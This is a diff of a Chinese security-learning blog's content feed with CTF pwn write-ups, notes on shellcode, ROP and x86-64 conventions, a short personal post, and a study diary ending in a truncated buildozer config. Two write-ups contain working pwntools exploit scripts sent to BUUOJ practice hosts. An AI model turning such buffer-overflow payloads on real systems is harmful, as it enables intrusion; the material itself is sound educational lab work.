+<h4 id="漏洞点：没有限制输入字符串长度"><a href="#漏洞点：没有限制输入字符串长度" class="headerlink" title="漏洞点：没有限制输入字符串长度"></a>漏洞点：没有限制输入字符串长度</h4><p>然后发现了一个flag函数，仔细查看后发现这是一个后门函数</p>
+<p><img src="/img/image-20210717101317225.png" alt="image-20210717101317225"></p>
+<p>win_function1函数</p>
+<p><img src="/img/image-20210717101703475.png" alt="image-20210717101703475"></p>
+<p>win_function2函数</p>
+<p><img src="/img/image-20210717101752632.png" alt="image-20210717101752632"></p>
+<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">需要注意点就是，有个判断 条件<span class="keyword">if</span> <span class="comment">( win1 &amp;&amp; win2 &amp;&amp; a1 == -559039827 )</span>，需要控制wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>、a<span class="number">1</span></span><br><span class="line">wi<span class="symbol">n1</span>、wi<span class="symbol">n2</span>可以通过调用对应的函数进行赋值，而a<span class="number">1</span>是作为flag函数的参数，在栈上构造好数据即可</span><br></pre></td></tr></table></figure>
+
+<p>先对win1赋值，使win1=1</p>
+<p>然后当win_function2的参数a1=-1163220307，对win2进行赋值，win2=1</p>
+<h3 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h3><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;i386&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28400</span>)</span><br><span class="line"></span><br><span class="line">win_function1 = <span class="number">0x080485CB</span></span><br><span class="line">win_function2 = <span class="number">0x080485D8</span></span><br><span class="line">flag = <span class="number">0x0804862B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">0x1c</span></span><br><span class="line">payload += p32(win_function1)</span><br><span class="line">payload += p32(win_function2) + p32(flag) + p32(<span class="number">0xBAAAAAAD</span>) + p32(<span class="number">0xDEADBAAD</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;input&gt; &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="注："><a href="#注：" class="headerlink" title="注："></a>注：</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">0xBAAAAAAD</span>是-<span class="number">1163220307</span>对应的<span class="number">16</span>进制的补码作为win_function<span class="number">2</span>函数的参数</span><br><span class="line"><span class="attribute">0xDEADBAAD</span>是-<span class="number">559039827</span>对应的<span class="number">16</span>进制的补码作为flag函数的参数</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/image-20210717103414365.png" alt="image-20210717103414365"></p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>shellcode</title>
+    <url>/2021/11/22/shellcode/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><p>主要是普及一下shellcode在pwntools中的用法</p>
+<h2 id="shellcraft模块"><a href="#shellcraft模块" class="headerlink" title="shellcraft模块"></a>shellcraft模块</h2><p>shellcraft模块是shellcode的模块，包含一些生成shellcode的函数。<br>其中的子模块声明架构，比如shellcraft.arm 是ARM架构的，shellcraft.amd64是AMD64架构，shellcraft.i386是Intel 80386架构的，以及有一个shellcraft.common是所有架构通用的。<br>有的时候我们需要在写exp的时候用到简单的shellcode，pwntools提供了对简单的shellcode的支持。<br>首先，常用的，也是最简单的shellcode，即调用/bin/sh可以通过shellcraft得到：<br>注意，由于各个平台，特别是32位和64位的shellcode不一样，所以最好先设置context。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(shellcraft.sh()) <span class="comment"># 打印出shellcode</span></span><br><span class="line"><span class="built_in">print</span>(asm(shellcraft.sh())) <span class="comment"># 打印出汇编后的shellcod</span></span><br></pre></td></tr></table></figure>
+
+<p>asm可以对汇编代码进行汇编，不过pwntools目前的asm实现还有一些缺陷，比如不能支持相对跳转等等，只可以进行简单的汇编操作。</p>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -933,6 +817,91 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
+    <title>一些危险函数和64位寄存器与32位不同之处</title>
+    <url>/2021/06/26/%E4%B8%80%E4%BA%9B%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C64%E4%BD%8D%E5%AF%84%E5%AD%98%E5%99%A8%E4%B8%8E32%E4%BD%8D%E4%B8%8D%E5%90%8C%E4%B9%8B%E5%A4%84/</url>
+    <content><![CDATA[<span id="more"></span>
+<p>列举一下常见的危险函数：</p>
+<h4 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h4><pre><code>    gets，直接读取一行，忽略&#39;\x00&#39;
+    scanf
+    vscanf
+</code></pre>
+<h4 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h4><pre><code>    sprintf
+</code></pre>
+<h4 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h4><pre><code>    strcpy，字符串复制，遇到&#39;\x00&#39;停止
+    strcat，字符串拼接，遇到&#39;\x00&#39;停止
+    copy
+</code></pre>
+<h3 id="64位与32位寄存器区别有："><a href="#64位与32位寄存器区别有：" class="headerlink" title="64位与32位寄存器区别有："></a>64位与32位寄存器区别有：</h3><p>64位有16个寄存器，32位只有8个。但是32位前8个都有不同的命名，分别是e _ ，而64位前8个使用了r代替e，也就是r_。<br>e开头的寄存器命名依然可以直接运用于相应寄存器的低32位。而剩下的寄存器名则是从r8 - r15，其低位分别用d，w,b指定长度。</p>
+<p>32位使用栈帧来作为传递的参数的保存位置，而64位使用寄存器，分别用rdi,rsi,rdx,rcx,r8,r9作为第1-6个参数。rax作为返回值。</p>
+<p>64位没有栈帧的指针，32位用ebp作为栈帧指针，64位取消了这个设定，rbp作为通用寄存器使用。</p>
+<p>64位支持一些形式的以PC相关的寻址，而32位只有在jmp的时候才会用到这种寻址方式。</p>
+<p><img src="/img/64.png"></p>
+<h3 id="过程（函数）调用的不同"><a href="#过程（函数）调用的不同" class="headerlink" title="过程（函数）调用的不同"></a>过程（函数）调用的不同</h3><pre><code>参数通过寄存器传递（见前文）
+callq 在栈里存放一个8位的返回地址
+许多函数不再有栈帧，只有无法将所有本地变量放在寄存器里的才会在栈上分配空间。
+函数可以获取到栈至多128字节的空间。这样函数就可以在不更改栈指针的情况下在栈上存储信息（也就是说，可以提前用rsp以下的128字节空间，这段空间被称为red zone，在x86-64里，时刻可用）
+不再有栈帧指针。现在栈的位置和栈指针相关。大多数函数在调用的一开始就分配全部所需栈空间，之后保持栈指针不改变。
+
+一些寄存器被设计成为被调用者-存储的寄存器。这些必须在需要改变他们值的时候存储他们并且之后恢复他们。
+</code></pre>
+<h3 id="参数传递的不同"><a href="#参数传递的不同" class="headerlink" title="参数传递的不同"></a>参数传递的不同</h3><pre><code>6个寄存器用来传递参数（见前文）
+剩下的寄存器按照之前的方式传递（不过是与rsp相关了，ebp不再作为栈帧指针，并且从rsp开始第7个参数，rsp+8开始第8个，以此类推）
+调用时，rsp向下移动8位（存入返回地址），寄存器参数无影响，第7个及之后的参数现在则是从rsp+8开始第7个，rsp+16开始第8个，以此类推
+</code></pre>
+<h3 id="栈帧的不同"><a href="#栈帧的不同" class="headerlink" title="栈帧的不同"></a>栈帧的不同</h3><p>很多情况下不再需要栈帧，比如在没有调用别的函数，且寄存器足以存储参数，那么就只需要存储返回地址即可。<br>需要栈帧的情况：</p>
+<pre><code>本地变量太多，寄存器不够
+一些本地变量是数组或结构体
+函数使用了取地址操作符来计算一个本地变量的地址
+函数必须用栈传送一些参数给另外一个函数
+函数需要保存一些由被调用者存储的寄存器的状态（以便于恢复）
+</code></pre>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>飞蓬大将军</title>
+    <url>/2021/06/17/%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E5%A4%8F%E5%A4%A9%EF%BC%8C%E5%8F%88%E6%98%AF%E4%B8%80%E5%B9%B4%E4%BB%99%E5%89%91/</url>
+    <content><![CDATA[<span id="more"></span>
+<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
+<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
+]]></content>
+      <categories>
+        <category>日常闲话</category>
+      </categories>
+      <tags>
+        <tag>生活</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基本ROP</title>
+    <url>/2021/06/20/%E5%9F%BA%E6%9C%ACROP/</url>
+    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
+<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
+<pre><code>程序存在溢出，并且可以控制返回地址。
+
+可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
+</code></pre>
+<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
+<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
+<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
+<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
+<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
+]]></content>
+      <categories>
+        <category>笔记</category>
+      </categories>
+      <tags>
+        <tag>笔记</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>bjdctf_2020_router</title>
     <url>/2022/01/21/%E5%88%B7%E6%96%B0%E4%B8%89%E8%A7%82%E7%AC%AC%E4%B8%80%E9%A2%98(bjdctf_2020_router)/</url>
     <content><![CDATA[<span id="more"></span>
@@ -949,6 +918,34 @@ callq 在栈里存放一个8位的返回地址
 <p><img src="/img/1643120311348.png" alt="1643120311348"></p>
 <p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
 <p>下班！</p>
+]]></content>
+      <categories>
+        <category>writeup</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>pwnable_simple_login</title>
+    <url>/2022/01/21/pwnable_simple_login/</url>
+    <content><![CDATA[<span id="more"></span>
+<h2 id="pwnable-simple-login"><a href="#pwnable-simple-login" class="headerlink" title="pwnable_simple_login"></a>pwnable_simple_login</h2><p>小萌新斗胆做了一下buu上第六页的一道pwn题，<del>纯粹是为了冲分，就是卷（bushi</del></p>
+<p>首先检查保护机制，32位文件，开NX，没有开PIE，那这个题目应该不会太难。</p>
+<p><img src="/img/1643120143654.png" alt="1643120143654"></p>
+<p>继续看IDA，main函数</p>
+<p><img src="/img/1643120156660.png" alt="1643120156660"></p>
+<p>这里的base64加密很新颖，以前的pwn题都没有见过，代码分析了一下，就是需要输入的s内容转base64编码，然后进行一个比较，正确的话才能进入到correct函数</p>
+<p>而correct函数中有后门函数system(‘/bin/sh’)。那么这个地方就该是关键</p>
+<p>于是继续找，找到auth函数里有了一个漏洞点</p>
+<p><img src="/img/1643120168747.png" alt="1643120168747"></p>
+<p>input最大12个字节，而v4只有8个字节，调试一下发现，覆盖的是主函数的ebp，经过调试发现控制ebp可以跳转到任意地址，那么跳转到哪呢，发现input是个固定地址,  input是我们输入的内容，依靠leave指令将执行system(“/bin/sh”)的地址赋给esp，最后ret指令将地址给eip，完成利用。</p>
+<p><img src="/img/1643120181750.png" alt="1643120181750"></p>
+<p><img src="/img/1643120196162.png" alt="1643120196162"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">io=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25390</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;Authenticate : &quot;</span>)</span><br><span class="line">payload=<span class="string">&quot;a&quot;</span>*<span class="number">4</span>+p32(<span class="number">0x0804927F</span>)+p32(<span class="number">0x0811EB40</span>)</span><br><span class="line">payload=payload.encode(<span class="string">&quot;base64&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>最后</p>
+<p><img src="/img/1643120231450.png" alt="1643120231450"></p>
 ]]></content>
       <categories>
         <category>writeup</category>
@@ -980,6 +977,46 @@ callq 在栈里存放一个8位的返回地址
       </tags>
   </entry>
   <entry>
+    <title>寒假学习(一)</title>
+    <url>/2022/01/22/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89%EF%BC%882022.1.17-2022.1.23%EF%BC%89/</url>
+    <content><![CDATA[<span id="more"></span>
+<h1 id="学习进度总结（一）（2022-1-17-2022-1-23）"><a href="#学习进度总结（一）（2022-1-17-2022-1-23）" class="headerlink" title="学习进度总结（一）（2022.1.17-2022.1.23）"></a>学习进度总结（一）（2022.1.17-2022.1.23）</h1><h2 id="作品赛项目Begin"><a href="#作品赛项目Begin" class="headerlink" title="作品赛项目Begin"></a>作品赛项目Begin</h2><p>13号回家后休息了两天就开始着手正事——创新实践作品赛</p>
+<ul>
+<li><p>第一次做作品赛项目，说实在的挺无从下手，因为什么经验也没有，先就是组队问题，既然说要实验室成员组队优先，那就熟人组队了。</p>
+</li>
+<li><p>组好队后开始讨论作品内容，商量半天想到了三个比较好的方案，最后经过讨论，确定下来题目：<strong>手机诈骗钓鱼软件的伪通讯录及ip地址生成</strong></p>
+</li>
+<li><p>内容确定，大致是要做一个手机app，于是第一个碰上的比较陌生的问题就是安卓打包，我们决定主要用python语言进行编写，找到最好的就是用python的kivy库进行编写，正好有配套的buildozer可以进行软件打包</p>
+</li>
+<li><p>说干就干，队伍分工，首先让我这个擅长debug的开始着手外包工作，软件打包。果不其然，一开始下载好buildozer就开始报错了，全是bug，一片红，可给我看得头大，慢慢debug吧，是个漫长的过程</p>
+</li>
+<li><p>经过两天两夜的辛苦debug，遇到最后一个最大的问题就是打包后的软件下载后打开闪退，终于在第三天，传来捷报！外包成功了，进度+1<del>哈哈哈哈</del>！</p>
+</li>
+<li><p>最强指令：</p>
+<figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">buildozer </span>-v <span class="keyword">android </span><span class="built_in">debug</span> run</span><br></pre></td></tr></table></figure></li>
+<li><p> 留下buildozer.spec文件的配置 </p>
+</li>
+</ul>
+<figure class="highlight vala"><table><tr><td class="code"><pre><span class="line">[app]</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Title of your application</span></span><br><span class="line">title = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package name</span></span><br><span class="line">package.name = myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Package domain (needed for android/ios packaging)</span></span><br><span class="line">package.domain = org.myapp</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Source code where the main.py live</span></span><br><span class="line">source.dir = </span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to include (let empty to include all the files)</span></span><br><span class="line">source.include_exts = py,png,jpg,kv,atlas</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of inclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.include_patterns = assets/*,images/*.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Source files to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_exts = spec</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of directory to exclude (let empty to not exclude anything)</span></span><br><span class="line"><span class="meta">#source.exclude_dirs = tests, bin</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of exclusions using pattern matching</span></span><br><span class="line"><span class="meta">#source.exclude_patterns = license,images/*/*.jpg</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 1)</span></span><br><span class="line">version = <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Application versioning (method 2)</span></span><br><span class="line"><span class="meta"># version.regex = __version__ = [&#x27;&quot;](.*)[&#x27;&quot;]</span></span><br><span class="line"><span class="meta"># version.filename = %(source.dir)s/main.py</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Application requirements</span></span><br><span class="line"><span class="meta"># comma separated e.g. requirements = sqlite3,kivy</span></span><br><span class="line">requirements = hostpython3, libffi, openssl, sdl2_image, sdl2_mixer, sdl2_ttf, sqlite3, python3, sdl2, setuptools, six, pyjnius, android, kivy, requests, kivy.app, certifi</span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Custom source folders for requirements</span></span><br><span class="line"><span class="meta"># Sets custom source for any requirements with recipes</span></span><br><span class="line"><span class="meta"># requirements.source.kivy = ../../kivy</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Garden requirements</span></span><br><span class="line"><span class="meta">#garden_requirements =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Presplash of the application</span></span><br><span class="line"><span class="meta">#presplash.filename = %(source.dir)s/data/presplash.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Icon of the application</span></span><br><span class="line"><span class="meta">#icon.filename = %(source.dir)s/icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)</span></span><br><span class="line">orientation = portrait</span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of service to declare</span></span><br><span class="line"><span class="meta">#services = NAME:ENTRYPOINT_TO_PY,NAME2:ENTRYPOINT2_TO_PY</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># OSX Specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># author = © Copyright Info</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># change the major version of python used by the app</span></span><br><span class="line">osx.python_version = <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># Kivy version to use</span></span><br><span class="line">osx.kivy_version = <span class="number">1.9</span><span class="number">.0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"><span class="meta"># Android specific</span></span><br><span class="line"><span class="meta">#</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Indicate if the application should be fullscreen or not</span></span><br><span class="line">fullscreen = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash background color (for new android toolchain)</span></span><br><span class="line"><span class="meta"># Supported formats are: #RRGGBB #AARRGGBB or one of the following names:</span></span><br><span class="line"><span class="meta"># red, blue, green, black, white, gray, cyan, magenta, yellow, lightgray,</span></span><br><span class="line"><span class="meta"># darkgray, grey, lightgrey, darkgrey, aqua, fuchsia, lime, maroon, navy,</span></span><br><span class="line"><span class="meta"># olive, purple, silver, teal.</span></span><br><span class="line"><span class="meta">#android.presplash_color = #FFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (string) Presplash animation using Lottie format.</span></span><br><span class="line"><span class="meta"># see https://lottiefiles.com/ for examples and https://airbnb.design/lottie/</span></span><br><span class="line"><span class="meta"># for general documentation.</span></span><br><span class="line"><span class="meta"># Lottie files can be created using various tools, like Adobe After Effect or Synfig.</span></span><br><span class="line"><span class="meta">#android.presplash_lottie = &quot;path/to/lottie/file.json&quot;</span></span><br><span class="line"> </span><br><span class="line"><span class="meta"># (str) Adaptive icon of the application (used if Android API level is 26+ at runtime)</span></span><br><span class="line"><span class="meta">#icon.adaptive_foreground.filename = %(source.dir)s/data/icon_fg.png</span></span><br><span class="line"><span class="meta">#icon.adaptive_background.filename = %(source.dir)s/data/icon_bg.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Permissions</span></span><br><span class="line">android.permissions = INTERNET</span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Target Android API, should be as high as possible.</span></span><br><span class="line"><span class="meta">#android.api = 27</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Minimum API your APK will support.</span></span><br><span class="line"><span class="meta">#android.minapi = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android SDK version to use</span></span><br><span class="line"><span class="meta">#android.sdk = 20</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK version to use</span></span><br><span class="line"><span class="meta">#android.ndk = 19b</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (int) Android NDK API to use. This is the minimum API your app will support, it should usually match android.minapi.</span></span><br><span class="line"><span class="meta">#android.ndk_api = 21</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) Use --private data storage (True) or --dir public storage (False)</span></span><br><span class="line"><span class="meta">#android.private_storage = True</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android NDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ndk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android SDK directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.sdk_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) ANT directory (if empty, it will be automatically downloaded.)</span></span><br><span class="line"><span class="meta">#android.ant_path =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then skip trying to update the Android sdk</span></span><br><span class="line"><span class="meta"># This can be useful to avoid excess Internet downloads or save time</span></span><br><span class="line"><span class="meta"># when an update is due and you just want to test/build your package</span></span><br><span class="line"><span class="meta"># android.skip_update = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (bool) If True, then automatically accept SDK license</span></span><br><span class="line"><span class="meta"># agreements. This is intended for automation only. If set to False,</span></span><br><span class="line"><span class="meta"># the default, you will be shown the license when first running</span></span><br><span class="line"><span class="meta"># buildozer.</span></span><br><span class="line"><span class="meta"># android.accept_sdk_license = False</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android entry point, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta">#android.entrypoint = org.renpy.android.PythonActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Android app theme, default is ok for Kivy-based app</span></span><br><span class="line"><span class="meta"># android.apptheme = &quot;@android:style/Theme.NoTitleBar&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Pattern to whitelist for the whole project</span></span><br><span class="line"><span class="meta">#android.whitelist =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom whitelist file</span></span><br><span class="line"><span class="meta">#android.whitelist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Path to a custom blacklist file</span></span><br><span class="line"><span class="meta">#android.blacklist_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java .jar files to add to the libs so that pyjnius can access</span></span><br><span class="line"><span class="meta"># their classes. Don&#x27;t add jars that you do not need, since extra jars can slow</span></span><br><span class="line"><span class="meta"># down the build process. Allows wildcards matching, for example:</span></span><br><span class="line"><span class="meta"># OUYA-ODK/libs/*.jar</span></span><br><span class="line"><span class="meta">#android.add_jars = foo.jar,bar.jar,path/to/more/*.jar</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) List of Java files to add to the android project (can be java or a</span></span><br><span class="line"><span class="meta"># directory containing the files)</span></span><br><span class="line"><span class="meta">#android.add_src =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android AAR archives to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.add_aars =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle dependencies to add (currently works only with sdl2_gradle</span></span><br><span class="line"><span class="meta"># bootstrap)</span></span><br><span class="line"><span class="meta">#android.gradle_dependencies =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) add java compile options</span></span><br><span class="line"><span class="meta"># this can for example be necessary when importing certain java libraries using the &#x27;android.gradle_dependencies&#x27; option</span></span><br><span class="line"><span class="meta"># see https://developer.android.com/studio/write/java8-support for further information</span></span><br><span class="line"><span class="meta"># android.add_compile_options = &quot;sourceCompatibility = 1.8&quot;, &quot;targetCompatibility = 1.8&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Gradle repositories to add &#123;can be necessary for some android.gradle_dependencies&#125;</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.gradle_repositories = &quot;maven &#123; url &#x27;https://kotlin.bintray.com/ktor&#x27; &#125;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) packaging options to add </span></span><br><span class="line"><span class="meta"># see https://google.github.io/android-gradle-dsl/current/com.android.build.gradle.internal.dsl.PackagingOptions.html</span></span><br><span class="line"><span class="meta"># can be necessary to solve conflicts in gradle_dependencies</span></span><br><span class="line"><span class="meta"># please enclose in double quotes </span></span><br><span class="line"><span class="meta"># e.g. android.add_packaging_options = &quot;exclude &#x27;META-INF/common.kotlin_module&#x27;&quot;, &quot;exclude &#x27;META-INF/*.kotlin_module&#x27;&quot;</span></span><br><span class="line"><span class="meta">#android.add_gradle_repositories =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Java classes to add as activities to the manifest.</span></span><br><span class="line"><span class="meta">#android.add_activities = com.example.ExampleActivity</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) OUYA Console category. Should be one of GAME or APP</span></span><br><span class="line"><span class="meta"># If you leave this blank, OUYA support will not be enabled</span></span><br><span class="line"><span class="meta">#android.ouya.category = GAME</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) Filename of OUYA Console icon. It must be a 732x412 png image.</span></span><br><span class="line"><span class="meta">#android.ouya.icon.filename = %(source.dir)s/data/ouya_icon.png</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) XML file to include as an intent filters in &lt;activity&gt; tag</span></span><br><span class="line"><span class="meta">#android.manifest.intent_filters =</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (str) launchMode to set for the main activity</span></span><br><span class="line"><span class="meta">#android.manifest.launch_mode = standard</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># (list) Android additional libraries to copy into libs/armeabi</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi = libs/android/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_armeabi_v7a = libs/android-v7/*.so</span></span><br><span class="line"><span class="meta">#android.add_libs_arm64_v8a = 